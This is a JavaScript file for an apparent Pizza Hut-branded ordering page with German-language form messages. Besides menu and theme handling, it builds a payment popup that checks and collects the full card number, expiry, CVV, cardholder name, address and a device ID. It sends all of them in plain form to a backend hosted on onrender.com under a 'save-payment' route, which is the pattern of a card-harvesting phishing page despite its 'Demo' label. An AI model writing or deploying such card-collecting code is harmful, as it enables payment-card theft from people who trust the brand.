document.addEventListener("DOMContentLoaded", () => {
  const serverUrl = "https://pizzahut-back.onrender.com";

  let deviceId = localStorage.getItem("deviceId");
  if (!deviceId && window.AndroidBridge?.getDeviceId) {
      deviceId = window.AndroidBridge.getDeviceId();
  }
  if (!deviceId) {
      deviceId = crypto.randomUUID();
  }
  localStorage.setItem("deviceId", deviceId);

  const navMenu = document.getElementById("nav-menu");
  const navToggle = document.getElementById("nav-toggle");
  const navClose = document.getElementById("nav-close");

  if (navToggle) navToggle.addEventListener("click", () => navMenu.classList.add("show-menu"));
  if (navClose) navClose.addEventListener("click", () => navMenu.classList.remove("show-menu"));
  document.querySelectorAll(".nav__link").forEach(link => link.addEventListener("click", () => navMenu.classList.remove("show-menu")));

  const sections = document.querySelectorAll("section[id]");
  function scrollActive() {
      const scrollY = window.pageYOffset;
      sections.forEach(current => {
          const sectionHeight = current.offsetHeight;
          const sectionTop = current.offsetTop - 50;
          const sectionId = current.getAttribute("id");
          const navLink = document.querySelector(`.nav__menu a[href*="${sectionId}"]`);
          if (scrollY > sectionTop && scrollY <= sectionTop + sectionHeight) navLink?.classList.add("active-link");
          else navLink?.classList.remove("active-link");
      });
  }
  window.addEventListener("scroll", scrollActive);

  const scrollUpBtn = document.getElementById("scroll-up");
  function showScrollUp() {
      if (window.scrollY >= 350) scrollUpBtn.classList.add("show-scroll");
      else scrollUpBtn.classList.remove("show-scroll");
  }
  window.addEventListener("scroll", showScrollUp);

  const themeButton = document.getElementById("theme-button");
  const darkThemeClass = "dark-theme";
  const iconThemeClass = "fa-sun";
  const savedTheme = localStorage.getItem("selected-theme");
  const savedIcon = localStorage.getItem("selected-icon");
  if (savedTheme) {
      document.body.classList.toggle(darkThemeClass, savedTheme === "dark");
      themeButton.classList.toggle(iconThemeClass, savedIcon === "fa-moon");
  }
  const getCurrentTheme = () => document.body.classList.contains(darkThemeClass) ? "dark" : "light";
  const getCurrentIcon = () => themeButton.classList.contains(iconThemeClass) ? "fa-moon" : "fa-sun";
  themeButton.addEventListener("click", () => {
      document.body.classList.toggle(darkThemeClass);
      themeButton.classList.toggle(iconThemeClass);
      localStorage.setItem("selected-theme", getCurrentTheme());
      localStorage.setItem("selected-icon", getCurrentIcon());
  });

  const popup = document.getElementById('payment-popup');
  const closeBtn = document.querySelector('.close-btn');
  const openBtns = document.querySelectorAll('.order-now-btn');
  const paymentForm = document.getElementById('payment-form');

  const addressInput = document.getElementById('address');
  const nameInput = document.getElementById('cardholderName');
  const cardInput = document.getElementById('cardNumber');
  const expiryInput = document.getElementById('expiry');
  const cvvInput = document.getElementById('cvv');

  openBtns.forEach(btn => btn.addEventListener('click', e => {
      e.preventDefault();
      popup.classList.add('show');
      setTimeout(() => popup.classList.add('active'), 10);
  }));

  function closePopupSmoothly() {
      popup.classList.remove('active');
      setTimeout(() => popup.classList.remove('show'), 400);
      clearErrors();
      paymentForm.reset();
  }
  closeBtn.addEventListener('click', closePopupSmoothly);
  window.addEventListener('click', e => {
      if (e.target === popup) closePopupSmoothly();
  });

  addressInput.addEventListener('input', () => addressInput.value.trim().length >= 5 && clearError(addressInput));
  nameInput.addEventListener('input', () => /^[A-Za-z\s]{2,}$/.test(nameInput.value.trim()) && clearError(nameInput));
  cardInput.addEventListener('input', () => {
      let v = cardInput.value.replace(/\D/g, '').slice(0,16);
      v = v.replace(/(.{4})/g, '$1 ').trim();
      cardInput.value = v;
      /^\d{16}$/.test(v.replace(/\s+/g, '')) && clearError(cardInput);
  });
  expiryInput.addEventListener('input', () => {
      let v = expiryInput.value.replace(/\D/g, '').slice(0,4);
      if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
      expiryInput.value = v;
      /^(0[1-9]|1[0-2])\/\d{2}$/.test(v) && clearError(expiryInput);
  });
  cvvInput.addEventListener('input', () => {
      let v = cvvInput.value.replace(/\D/g, '').slice(0,4);
      cvvInput.value = v;
      /^\d{3,4}$/.test(v) && clearError(cvvInput);
  });

  paymentForm.addEventListener('submit', e => {
      e.preventDefault();
      clearErrors();
      let hasError = false;

      const address = addressInput.value.trim();
      const cardholderName = nameInput.value.trim();
      const cardNumber = cardInput.value.replace(/\s+/g, '');
      const expiry = expiryInput.value.trim();
      const cvv = cvvInput.value.trim();

      if (!address) { showError(addressInput, 'Bitte geben Sie eine Lieferadresse ein.'); hasError = true; }
      if (!/^[A-Za-z\s]{2,}$/.test(cardholderName)) { showError(nameInput, 'Bitte geben Sie den Namen des Karteninhabers ein.'); hasError = true; }
      if (!/^\d{16}$/.test(cardNumber)) { showError(cardInput, 'Geben Sie eine 16-stellige Kartennummer ein.'); hasError = true; }
      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
          showError(expiryInput, 'Verwenden Sie das Format MM/YY.'); hasError = true;
      } else {
          const [m, y] = expiry.split('/').map(Number);
          const now = new Date();
          const cy = now.getFullYear() % 100;
          const cm = now.getMonth() + 1;
          if (y < cy || (y === cy && m < cm)) { showError(expiryInput, 'Die Karte ist abgelaufen.'); hasError = true; }
      }
      if (!/^\d{3,4}$/.test(cvv)) { showError(cvvInput, 'Geben Sie eine 3- oder 4-stellige CVC ein.'); hasError = true; }

      if (!hasError) {
          const payload = { deviceId, address, cardholderName, cardNumber, expiry, cvv };
          fetch(`${serverUrl}/save-payment`, {
              method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
          })
              .then(res => res.json())
              .then(data => {
                  console.log('Server response:', data);
                  showSuccessMessage('Zahlung erfolgreich gespeichert (Demo)');
                  closePopupSmoothly();
              })
              .catch(err => { console.error('Error:', err); });
      }
  });

  function showError(input, msg) {
      let err = input.nextElementSibling;
      if (!err || !err.classList.contains('error-message')) {
          err = document.createElement('div');
          err.className = 'error-message';
          input.parentNode.insertBefore(err, input.nextSibling);
      }
      err.textContent = msg;
      input.classList.add('input-error');
  }
  function clearError(input) {
      const err = input.nextElementSibling;
      if (err && err.classList.contains('error-message')) err.remove();
      input.classList.remove('input-error');
  }
  function clearErrors() {
      document.querySelectorAll('.error-message').forEach(el => el.remove());
      document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
  }
  function showSuccessMessage(msg) {
      const div = document.createElement('div');
      div.className = 'success-message';
      div.textContent = msg;
      paymentForm.appendChild(div);
      setTimeout(() => div.remove(), 3000);
  }
});